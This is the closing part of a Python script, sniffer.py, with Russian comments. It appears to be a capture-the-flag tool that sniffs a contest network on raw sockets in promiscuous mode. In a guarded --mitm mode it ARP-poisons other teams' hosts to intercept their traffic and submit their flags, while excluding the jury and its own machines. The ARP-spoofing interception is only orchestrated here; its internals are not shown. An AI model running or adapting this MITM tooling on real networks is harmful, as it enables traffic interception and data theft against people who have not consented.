    if args.selftest:
        selftest()
        return
    if args.init:
        init_config(args.config)
        return
    cfg = load_cfg(args.config)
    if args.iface:
        cfg["iface"] = args.iface
    if args.once:
        cfg["sniff_once_sec"] = args.once
    if args.dry_run:
        cfg["_dry"] = True

    # raw-sockets нужны root во ВСЕХ сетевых режимах (в т.ч. discover)
    if os.geteuid() != 0:
        print("Нужен root: raw-sockets. Запуск: sudo python3 sniffer.py ...")
        sys.exit(2)

    iface = cfg["iface"] or default_iface()

    if args.discover:
        discover(cfg, iface)
        return

    if not args.passive and not args.mitm:
        print("Укажи режим: --passive (безопасно) или --mitm (травля). "
              "Справка: python3 sniffer.py --help")
        return

    if not cfg.get("team_token") or "PASTE" in str(cfg.get("team_token", "")):
        print("!! team_token не заполнен в %s — сдача невозможна." % args.config)
        if not args.dry_run:
            print("   Заполни токен (tune.py) или перезапусти с --dry-run.")
            sys.exit(2)

    # наш IP + наша коробка -> свои флаги не сдаём
    me = my_ip()
    own = set(cfg.get("own_ips") or [])
    own.add(me)
    if cfg.get("my_team"):
        own.add(cfg["subnet_template"].format(t=cfg["my_team"]))
    cfg["own_ips"] = sorted(own)

    state = SniffState(os.path.join(SELF_DIR, cfg["sniff_state_file"]))
    canaries = farm.load_canaries(cfg)
    log("iface=%s мы=%s цели-own=%s dry=%s" % (
        iface, me, ",".join(cfg["own_ips"]), bool(cfg.get("_dry"))))
    log("canaries+denylist: %d строк" % len(canaries))

    signal.signal(signal.SIGINT, _sig)
    signal.signal(signal.SIGTERM, _sig)

    sock = socket.socket(socket.AF_PACKET, socket.SOCK_RAW,
                         socket.ntohs(0x0003))
    sock.bind((iface, 0))
    sock.settimeout(1.0)
    set_promisc(sock.fileno(), iface, True)
    log("promisc включён (на выходе снимем)")

    mitm = None
    try:
        if args.mitm:
            if not args.arp_ok:
                print("Режим MITM вмешивается в L2 соседей. Запускай ТОЛЬКО "
                      "если правилами разрешено: добавь --arp-ok.")
                return
            base = subnet_base(cfg)
            gw_ip = base + "1"
            if me == "127.0.0.1":
                print("Не определил наш IP — MITM опасен, отменяю.")
                return
            # цели
            if args.all:
                if not args.yes:
                    print("Травить ВСЮ подсеть? Добавь --yes, если уверен.")
                    return
                alive = discover(cfg, iface)
                targets = [ip for ip in alive
                           if ip not in cfg["own_ips"] and ip != gw_ip
                           and not in_net(ip, JURY_NET)]
            else:
                targets = [t.strip() for t in args.targets.split(",") if t.strip()]
            # железное правило: травим ТОЛЬКО наш /24, не жюри и не своих
            bad = [t for t in targets
                   if not t.startswith(base) or in_net(t, JURY_NET)
                   or t in cfg["own_ips"]]
            if bad:
                print("ЭТИ ЦЕЛИ ВНЕ НАШЕГО /24 ИЛИ СВОИ/ЖЮРИ — запрещено: %s" % bad)
                return
            if not targets:
                print("Список целей пуст — травить некого.")
                return
            mitm = MitmManager(sock, iface, my_mac(iface), me, gw_ip,
                               float(cfg["arp_poison_period"]))
            mitm._pending_targets = targets   # ДО resolve: кого спрашивать
            log("резолв MAC: шлюз %s + цели" % gw_ip)
            macs = mitm.resolve_macs()
            gw_mac = macs.get(gw_ip)
            if not gw_mac:
                print("Шлюз не ответил на ARP (%s) — травля отменена." % gw_ip)
                return
            mitm.start(targets, macs, gw_mac)
            log("MITM активен: цели %s" % targets)
            log("шлюз %s (%s); Ctrl-C — остановка с авто-ремонтом" % (gw_ip, gw_mac))
        else:
            log("пассивный режим: только слушаем, никого не травим")

        threading.Thread(target=submitter_loop,
                         args=(state, cfg, canaries, stop_event,
                               bool(cfg.get("_dry"))), daemon=True).start()
        if cfg.get("sniff_once_sec"):
            threading.Timer(float(cfg["sniff_once_sec"]),
                            stop_event.set).start()
        sniff_loop(sock, state, cfg, canaries, stop_event,
                   bool(cfg.get("_dry")), my_mac(iface))
    finally:
        log("останавливаюсь, чиню всё, что трогал...")
        stop_event.set()
        if mitm is not None:
            mitm.stop.set()
            mitm.restore()
        set_promisc(sock.fileno(), iface, False)
        state.save()
        sock.close()
        log("готово. state: %s" % cfg["sniff_state_file"])


if __name__ == "__main__":
    main()
